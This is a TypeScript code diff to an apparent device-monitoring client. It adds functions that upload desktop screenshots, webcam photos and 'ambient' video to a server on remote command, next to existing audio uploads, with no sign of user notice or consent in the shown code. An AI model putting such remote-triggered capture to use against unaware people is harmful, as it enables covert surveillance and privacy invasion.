@@ -139,12 +139,35 @@ export async function markRead(token: string, messageId: number): Promise<void> 
 
 // ── Monitoring helpers (used by monitoring.ts) ─────────────────────────────────
 
+function base64ToBlob(b64: string, mime: string): Blob {
+  const bytes = atob(b64);
+  const arr = new Uint8Array(bytes.length);
+  for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
+  return new Blob([arr], { type: mime });
+}
+
 export async function uploadScreenshot(token: string, b64: string, commandId: number) {
-  const blob = await fetch(`data:image/png;base64,${b64}`).then(r => r.blob());
+  const blob = base64ToBlob(b64, 'image/png');
+  const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
   const form = new FormData();
-  form.append('file', blob, 'screenshot.png');
+  form.append('file', blob, `desktop_${ts}.png`);
   form.append('command_id', String(commandId));
   form.append('context', 'screenshot');
+  form.append('device_type', 'desktop');
+  await fetch(`${BASE}/device-data/screenshot/upload`, {
+    method: 'POST',
+    headers: { Authorization: `Bearer ${token}` },
+    body: form,
+  });
+}
+
+export async function uploadWebcamPhoto(token: string, blob: Blob, commandId: number) {
+  const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+  const form = new FormData();
+  form.append('file', blob, `desktop_photo_${ts}.jpg`);
+  form.append('command_id', String(commandId));
+  form.append('context', 'photo');
+  form.append('device_type', 'desktop');
   await fetch(`${BASE}/device-data/screenshot/upload`, {
     method: 'POST',
     headers: { Authorization: `Bearer ${token}` },
@@ -167,6 +190,19 @@ export async function uploadAudioRecording(token: string, blob: Blob, duration: 
   form.append('duration', String(duration));
   form.append('is_encrypted', 'false');
   await fetch(`${BASE}/monitoring/upload_audio`, {
+    method: 'POST',
+    headers: { Authorization: `Bearer ${token}` },
+    body: form,
+  });
+}
+
+export async function uploadVideoRecording(token: string, blob: Blob, duration: number) {
+  const form = new FormData();
+  form.append('file', blob, 'recording.webm');
+  form.append('duration', String(duration));
+  form.append('context', 'ambient');
+  form.append('is_encrypted', 'false');
+  await fetch(`${BASE}/monitoring/video/upload`, {
     method: 'POST',
     headers: { Authorization: `Bearer ${token}` },
     body: form,
